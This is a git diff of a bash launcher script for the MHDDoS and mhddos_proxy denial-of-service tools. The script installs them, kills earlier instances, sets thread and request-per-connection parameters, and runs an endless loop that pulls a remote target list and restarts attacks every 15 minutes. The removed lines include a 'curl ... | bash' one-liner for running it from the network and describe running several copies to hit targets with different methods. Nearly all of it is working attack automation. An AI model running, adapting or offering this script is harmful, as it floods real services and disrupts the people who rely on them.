@@ -1,7 +1,7 @@
 #!/bin/bash
 
-sudo apt update -y
 # Install git, python3 etc.
+sudo apt update -y
 sudo apt install git python3 python3-pip-y
 sudo pip install --upgrade pip
 
@@ -15,73 +15,30 @@ sudo git clone https://github.com/MHProDev/MHDDoS.git
 sudo python3 -m pip install -r MHDDoS/requirements.txt
 cd ~
 
-#Just in case kill previous copy of mhddos_proxy
-pkill -f start.py
-pkill -f runner.py
-
-
-
-
-
-##### Use next command in local linux terminal to run this script.
-#  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash  <<<<<
-##### It is possible to pass arguments "num_of_copies" and "restart_interval" to script.
-##### curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash -s -- 2 1800 (launch with num_of_copies=2 and restart_interval=1800)
+#Just in case kill previous copies of mhddos and mhddos_proxy
+pkill -f start.py; pkill -f runner.py
 
 ##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.
 
-## "num_of_copies" allows to start several copies of runner.py.
-## Each copy will choose different target from https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets
-## This is different from "multiple targets" in mhddos_proxy. Built in mhddos_proxy "multiple targets" can attack multiple IP's but only with same one method.
-## "num_of_copies" allows to launch several copies of runner.py and targets will be attacked with different methods.
-## Default = 2 copies(instances). Don't use high values without testing first, pc/vps can slowdown.
+
 num_of_copies="${1:-2}"
-
-## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
-## It allows to download updates for mhddos_proxy, MHDDoS and target list.
-## By default 900s (15m), can be passed as second parameter
-restart_interval="${2:-900}"
-
-
-#parameters that passed to python scrypt
-threads="${3:-500}"
+threads="${1:-1000}"
 threads="-t $threads"
-rpc="${4:-50}"
+rpc="${2:-50}"
 rpc="--rpc $rpc"
+## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
+restart_interval="${3:-900}"
+
+
 proxy_interval=3600
 proxy_interval="-p $proxy_interval"
 
-#Just in case kill previous copy of mhddos_proxy
-pkill -f start.py
-pkill -f runner.py
-
-# Install git, python3, pip if doesn't installed already
-if [ ! -f /usr/bin/git ]; then
-   sudo apt install git -y
-fi
-if [ ! -f /usr/bin/python3 ]; then
-   sudo apt install python3 -y
-fi
-if [ ! -f /usr/bin/pip ]; then
-   apt install python3-pip  -y
-fi
-pip install --upgrade pip > /dev/null #No output. Resolved some problems with pip on debian
-
-
-#Install latest version of mhddos_proxy and MHDDoS
-cd ~
-rm -rf mhddos_proxy
-git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
-cd mhddos_proxy
-git clone https://github.com/MHProDev/MHDDoS.git
-python3 -m pip install -r MHDDoS/requirements.txt
 
 # Restart attacks and update targets list every 15 minutes (by default)
 while true
-echo -e "#####################################\n"
 do
-   # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
-   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py" | wc -l)
+   # Get number of targets in runner_targets.
+   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^[^#]" | wc -l)
    
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
